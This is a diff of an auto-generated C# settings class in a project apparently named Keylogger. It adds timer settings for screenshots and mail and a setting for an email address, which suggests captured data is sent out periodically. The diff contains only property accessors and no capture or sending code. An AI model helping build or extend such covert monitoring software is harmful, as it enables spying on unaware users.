@@ -50,12 +50,36 @@ namespace Keylogger.Properties {
         [global::System.Configuration.UserScopedSettingAttribute()]
         [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
         [global::System.Configuration.DefaultSettingValueAttribute("0")]
-        public string txtNumTimerProp {
+        public string txtNumTimerScreenProp {
             get {
-                return ((string)(this["txtNumTimerProp"]));
+                return ((string)(this["txtNumTimerScreenProp"]));
             }
             set {
-                this["txtNumTimerProp"] = value;
+                this["txtNumTimerScreenProp"] = value;
+            }
+        }
+        
+        [global::System.Configuration.UserScopedSettingAttribute()]
+        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+        [global::System.Configuration.DefaultSettingValueAttribute("0")]
+        public string txtNumTimerMailProp {
+            get {
+                return ((string)(this["txtNumTimerMailProp"]));
+            }
+            set {
+                this["txtNumTimerMailProp"] = value;
+            }
+        }
+        
+        [global::System.Configuration.UserScopedSettingAttribute()]
+        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+        [global::System.Configuration.DefaultSettingValueAttribute("")]
+        public string txtBoxMailProp {
+            get {
+                return ((string)(this["txtBoxMailProp"]));
+            }
+            set {
+                this["txtBoxMailProp"] = value;
             }
         }
     }
